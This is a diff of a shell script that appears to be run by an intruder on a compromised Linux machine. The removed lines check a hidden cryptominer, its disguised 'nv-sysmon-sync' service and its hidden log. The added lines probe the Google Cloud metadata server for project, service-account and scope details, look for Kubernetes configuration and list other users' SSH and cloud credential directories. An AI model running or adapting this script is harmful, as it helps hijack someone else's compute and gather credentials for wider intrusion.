@@ -1,6 +1,15 @@
-echo "=== cfg ==="; cat /home/dev/ComfyUI/user/default/ComfyUI-Manager/config.ini 2>&1
-echo "=== nodes d2 ==="; ls /home/dev/ComfyUI/custom_nodes 2>/dev/null | grep -i -E 'd2|hello' || echo none
-echo "=== miner ==="; c=0; for p in /proc/[0-9]*; do ex=$(readlink "$p/exe" 2>/dev/null); case "$ex" in */.nvhd/.m*) c=$((c+1));; esac; done; echo "procs=$c"
-nvidia-smi --query-gpu=utilization.gpu,power.draw --format=csv,noheader
-systemctl is-active nv-sysmon-sync; systemctl is-enabled nv-sysmon-sync
-tail -3 /usr/lib/.nvhd/.glog
+echo "=== net ==="; ip -4 -o addr 2>/dev/null | awk '{print $2,$4}'; ip route 2>/dev/null | head -4
+echo "=== hosts ==="; cat /etc/hosts
+echo "=== metadata ==="
+M=http://169.254.169.254/computeMetadata/v1
+H='Metadata-Flavor: Google'
+echo -n "project: "; curl -s -m 5 -H "$H" $M/project/project-id; echo
+echo -n "inst: ";    curl -s -m 5 -H "$H" $M/instance/name; echo
+echo -n "zone: ";    curl -s -m 5 -H "$H" $M/instance/zone; echo
+echo -n "ip: ";      curl -s -m 5 -H "$H" $M/instance/network-interfaces/0/ip; echo
+echo -n "sa: ";      curl -s -m 5 -H "$H" $M/instance/service-accounts/default/email; echo
+echo "scopes:";      curl -s -m 5 -H "$H" $M/instance/service-accounts/default/scopes | head -12
+echo "=== k8s hints ==="
+ls /etc/kubernetes /var/lib/kubelet /root/.kube 2>&1 | head -8
+echo "=== other users ssh/cloud ==="
+for d in /home/*; do [ -d "$d" ] && ls -a "$d" 2>/dev/null | grep -E '^\.(ssh|kube|config)$|gcloud' | sed "s|^|$d: |"; done | head -20
